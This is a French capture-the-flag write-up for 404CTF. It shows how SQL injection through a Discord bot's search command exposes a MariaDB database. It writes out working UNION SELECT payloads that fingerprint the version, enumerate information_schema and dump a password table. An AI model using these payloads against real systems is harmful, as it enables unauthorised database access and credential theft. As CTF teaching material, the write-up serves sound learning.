On teste un peu tous les caractères qui peuvent mener à une injection
Au bout de quelques tests, on remarque que la commande
`!chercher "#`
affiche une liste de tous les résultats possibles

```
Results:
Result #1:
>404CTF{Tu croyais que c'était le flag?}
Result #2:
>never gonna give you up
Result #3:
>top secret
Result #4:
>mot de passe
Result #5:
>password
Result #6:
>flag
Result #7:
>drapeau
Result #8:
>hallebarde
Result #9:
>404CTF
Result #10:
>ennemi
Result #11:
>allié
Result #12:
>attaque
Result #13:
>défense
Result #14:
>espionnage
Result #15:
>dgse
Result #16:
>bcra
Result #17:
>france
Result #18:
>ministère des armées
Result #19:
>telecom sudparis
Result #20:
>hackademint
Result #21:
>minet
```

Le script est commenté par # et s'arrête aux " : c'est du bash, du SQL ou du python
Il accepte true, or, True et ||
Probablement du SQL du coup

`!chercher " UNION SELECT version() #`

Ça rend

`10.6.7-MariaDB`

Cool ! On check la syntaxe de mariadb pour les sqli
On se rend compte qu'on est limités à une seule colonne (forcément, c'est ce que renvoie le bot)
On concatène donc les infos habituelles

`!chercher  aaaa" UNION SELECT CONCAT_WS(" : ", table_schema, table_name, column_name) FROM information_schema.columns WHERE table_schema != "information_schema" #`

```
Result #1:
>data : Privileged_users : user
Result #2:
>data : data : message
Result #3:
>data : password : password

```

Parfait

Dans `data.message`, on a les résultats habituels de la requête au bot
Dans `Privileged_users.user`, on a des uuid

On se doute qu'on a des trucs cools dans password.password

`!chercher ." UNION SELECT password FROM password  #`

```
Result #1:
>404CTF{D1sc0rd_&_injection_SQL}
```

On a notre flag
